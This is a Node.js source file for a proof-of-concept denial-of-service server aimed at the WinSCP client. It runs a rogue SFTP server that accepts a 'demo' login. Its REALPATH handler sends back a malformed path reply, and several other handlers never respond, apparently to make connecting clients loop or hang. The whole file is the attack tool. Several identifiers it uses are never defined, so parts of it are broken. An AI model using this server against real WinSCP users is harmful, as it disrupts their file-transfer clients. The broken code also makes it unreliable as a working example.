console.clear();

const fs = require('fs-extra');
const ssh2 = require('ssh2');
const path = require('path');
const { timingSafeEqual } = require('crypto');
const SftpServer = require('ssh2-sftp-server');

console.clear();

console.log("WinSCP Denial of Service PoC Server");

const dirname = path.normalize(path.join(__dirname, 'files'));

function checkIfValueIsEqual(input2, allowed2) {
    let input = Buffer.from(input2);
    let allowed = Buffer.from(allowed2);

    const autoReject = (input.length !== allowed.length);
    if (autoReject) {
        // Prevent leaking length information by always making a comparison with the
        // same input when lengths don't match what we expect ...
        allowed = input;
    }
    const isMatch = timingSafeEqual(input, allowed);
    return (!autoReject && isMatch);
}

const login = (user = "", password = "") => {
    if (checkIfValueIsEqual(user, 'demo') && checkIfValueIsEqual(password, ''))
        return true;
    else
        return false;
}

const getUserType = (user = "") => {
    return 'client';
}



new ssh2.Server({
    // banner: "Welcome to Reh@Store",
    hostKeys: [fs.readFileSync('host.key')]
}, (client) => {
    console.log('Client connected!');
    let username;

    client.on('authentication', (ctx) => {
        try {
            console.log(ctx.method);
            switch (ctx.method) {
                case 'password':
                    if (!login(ctx.username, ctx.password)) {
                        console.log("Login failed! Wrong username or password");
                        console.log(ctx.username, ctx.password);
                        return ctx.reject(['Wrong username or password']);
                    }
                    break;
                default:
                    //return ctx.reject(['password']);
                    break;
            }
            username = ctx.username;
            ctx.accept();
        } catch (err) {
            console.log(err);
            return ctx.reject();
        }

    }).on('ready', () => {
        console.log('Client authenticated!');
        client.on('session', (accept, reject) => {
            const session = accept();
            session.on('sftp', (accept, reject) => {
                console.log('Client SFTP session for user "', username, '"');
                const sftp = accept();

                var openFiles = {};
                var handleCount = 0;

                let numRealPath = 0;
                sftp.on('OPEN', function (reqid, filename, flags, attrs) {
                    // only allow opening /tmp/foo.txt for writing
                    if (filename !== '/tmp/foo.txt' || !(flags & OPEN_MODE.WRITE))
                        return sftp.status(reqid, STATUS_CODE.FAILURE);
                    // create a fake handle to return to the client, this could easily
                    // be a real file descriptor number for example if actually opening
                    // the file on the disk
                    var handle = new Buffer(4);
                    openFiles[handleCount] = true;
                    handle.writeUInt32BE(handleCount++, 0);
                    sftp.handle(reqid, handle);
                    console.log('Opening file for write')
                }).on('WRITE', function (reqid, handle, offset, data) {
                    if (handle.length !== 4 || !openFiles[handle.readUInt32BE(0)])
                        return sftp.status(reqid, STATUS_CODE.FAILURE);
                    // fake the write
                    sftp.status(reqid, STATUS_CODE.OK);
                    var inspected = require('util').inspect(data);
                }).on('READ', (reqID, handle, offset, length) => {
                    console.info('READ', { team: username });
                }).on('FSTAT', (reqID, handle,) => {
                    console.info('FSTAT', { team: username });
                }).on('FSETSTAT', (reqID, handle) => {
                    console.info('FSETSTAT', { team: username });
                }).on('OPENDIR', (reqID, requestedPath) => {
                    console.info('OPENDIR', { team: username });
                }).on('READDIR', (reqID, handle) => {
                    console.info('READDIR', { team: username });
                }).on('LSTAT', (reqID, requestedPath) => {
                    let wantedPath = path.resolve(requestedPath);
                    console.info('LSTAT', { user: username, path: wantedPath });
                    try {
                        var fstats = fs[statType](wantedPath);
                        let stats = pick(fstats, ['mode', 'uid', 'gid', 'size', 'atime', 'mtime']);

                        return this.sftpStream.attrs(reqID, stats);
                    } catch (err) {
                        let code = err.code;

                        console.log(code);
                        if (['ENOTEMPTY', 'ENOTDIR', 'ENOENT'].includes(code))
                            return sftp.status(reqID, ssh2.utils.sftp.STATUS_CODE.NO_SUCH_FILE);
                        if (['EACCES', 'EEXIST', 'EISDIR'].includes(code))
                            return sftp.status(reqID, ssh2.utils.sftp.STATUS_CODE.PERMISSION_DENIED);

                        return sftp.status(reqID, ssh2.utils.sftp.STATUS_CODE.FAILURE);
                    }
                }).on('STAT', (reqID, requestedPath) => {
                    console.info('STAT', { team: username });
                }).on('REMOVE', (reqID, requestedPath) => {
                    console.info('REMOVE', { team: username });
                }).on('RMDIR', (reqID, requestedPath) => {
                    console.info('READ', { team: username });
                }).on('REALPATH', (reqID, requestedPath) => { //Implementado
                    let wantedPath = path.resolve(requestedPath);
                    console.info('REALPATH', { user: username, path: wantedPath });
                    sftp.name(reqID, [{ file: 'Zlynt' }]);
                    numRealPath++;
                    console.log("Number o realpath invokes: ", numRealPath);
                }).on('READLINK', (reqID, requestedPath) => {
                    console.info('READLINK', { team: username });
                }).on('SETSTAT', (reqID, requestedPath, attrs) => {
                    console.info('SETSTAT', { team: username });
                }).on('MKDIR', (reqID, requestedPath, attrs) => {
                    console.info('MKDIR', { team: username });
                }).on('RENAME', (reqID, oldPath, newPath) => {
                    console.info('RENAME', { team: username });
                }).on('SYMLINK', (reqID, linkpath, tagetpath) => {
                    console.info('SYMLINK', { team: username });
                }).on('end', () => {
                    console.info('end', { team: username });
                }).on('close', () => {
                    console.info('close', { team: username });
                }).on('continue', (reqID, handle, offset, length) => {
                    console.info('continue', { team: username });
                }).on('CLOSE', (reqid, handle) => {
                    var fnum;
                    if (handle.length !== 4 || !openFiles[(fnum = handle.readUInt32BE(0))])
                        return sftp.status(reqid, STATUS_CODE.FAILURE);
                    delete openFiles[fnum];
                    sftp.status(reqid, STATUS_CODE.OK);
                    console.log('Closing file');
                }).on('error', (e) => {
                    console.error('An SFTP error happened: ', e);
                });
            });
        });
    }).on('close', () => {
        console.log('Client disconnected');
    });
}).listen(22, '127.0.0.1', function () {
    console.log('Listening on port ' + this.address().port);
});